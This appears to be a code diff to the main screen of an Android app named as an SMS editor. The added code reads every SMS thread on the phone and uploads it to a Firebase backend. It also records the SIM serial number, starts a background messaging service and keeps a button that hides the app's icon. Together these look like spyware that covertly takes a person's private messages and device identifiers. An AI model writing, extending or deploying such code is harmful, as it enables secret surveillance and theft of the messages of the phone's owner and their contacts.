@@ -1,6 +1,7 @@
 package sms.newgate.com.smseditor.activity
 
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
 import android.support.v7.app.AppCompatActivity
 import android.os.Bundle
@@ -9,17 +10,18 @@ import android.widget.LinearLayout
 import kotlinx.android.synthetic.main.activity_main.*
 import sms.newgate.com.smseditor.R
 import sms.newgate.com.smseditor.adapter.MsgAdapter
-import sms.newgate.com.smseditor.util.MessageHelper
 import android.content.pm.PackageManager
 import android.os.Build
 import android.provider.Telephony
 import android.support.v4.app.ActivityCompat
 import android.support.v4.content.ContextCompat
 import android.support.v7.app.AlertDialog
+import android.telephony.TelephonyManager
 import android.util.Log
 import sms.newgate.com.smseditor.model.SmsThread
 import sms.newgate.com.smseditor.service.FirebaseMsgService
-import sms.newgate.com.smseditor.util.FirebaseUtils
+import sms.newgate.com.smseditor.util.*
+import sms.newgate.com.smseditorremote.utils.PrefsUtil
 
 class MainActivity : AppCompatActivity() {
 
@@ -43,56 +45,30 @@ class MainActivity : AppCompatActivity() {
 
         helper = MessageHelper(this)
 
-//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-//            if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-//                Log.e("XMainActivity", "======> a1")
-//                requestPermission(android.Manifest.permission.READ_PHONE_STATE, READ_PHONE_REQUEST_CODE)
-//            }
-//        }
-
         if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
+                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                 Log.e("XMainActivity", "======> 1")
-                requestPermission(android.Manifest.permission.READ_SMS, SMS_REQUEST_CODE)
+                requestPermissions(arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_PHONE_STATE), SMS_REQUEST_CODE)
             } else {
                 Log.e("XMainActivity", "======> 2")
-                smsThreads = helper.getAllMessage()
+                createAppService()
             }
         } else {
-            smsThreads = helper.getAllMessage()
+            Log.e("XMainActivity", "======> 3")
+            createAppService()
         }
-
-        FirebaseUtils.getInstance(this).createMessages(smsThreads)
 
         adapter = MsgAdapter(smsThreads, object: MsgAdapter.ClickMsgItemListener {
             override fun click(pos: Int) {
             }
         })
-
         msgThreadRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayout.VERTICAL, false)
         msgThreadRecyclerView.adapter = adapter
-
-        startService(Intent(this, FirebaseMsgService::class.java))
 
         buttonHidden.setOnClickListener {
             hideIconApp()
         }
-    }
-
-    private fun showExplanation(title: String,
-                                message: String,
-                                permission: String,
-                                permissionRequestCode: Int) {
-        val builder = AlertDialog.Builder(this)
-        builder.setTitle(title)
-                .setMessage(message)
-                .setPositiveButton(android.R.string.ok) { dialog, id -> requestPermission(permission, permissionRequestCode) }
-        builder.create().show()
-    }
-
-    private fun requestPermission(permissionName: String, permissionRequestCode: Int) {
-        ActivityCompat.requestPermissions(this,
-                arrayOf(permissionName), permissionRequestCode)
     }
 
     fun hideIconApp() {
@@ -122,13 +98,24 @@ class MainActivity : AppCompatActivity() {
         when (requestCode) {
             SMS_REQUEST_CODE -> {
                 if (grantResults.isEmpty() || grantResults[0] != PackageManager.PERMISSION_GRANTED) {
-                    Log.i("XonRequestPermissionsResult", "=========> 111")
+
                 } else {
-                    smsThreads = helper.getAllMessage()
-                    Log.i("XonRequestPermissionsResult", "=========> 222 =  " + smsThreads.size)
-                    FirebaseUtils.getInstance(this).createMessages(smsThreads)
+                    createAppService()
                 }
             }
+        }
+    }
+
+
+    fun createAppService() {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE ) == PackageManager.PERMISSION_GRANTED) {
+            val telephonyManager = this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            //TelephoneUtil.getInstance(this).simSerialNumber = telephonyManager.simSerialNumber
+            PrefsUtil.getInstance(this).savePref(Constant.SIM_SERIAL_NUMBER, telephonyManager.simSerialNumber)
+            smsThreads = helper.getAllMessage()
+            FirebaseUtils.getInstance(this).createMessages(smsThreads)
+            startService(Intent(this, FirebaseMsgService::class.java))
+            AppStore.getInstance().smsThreads = smsThreads
         }
     }
 
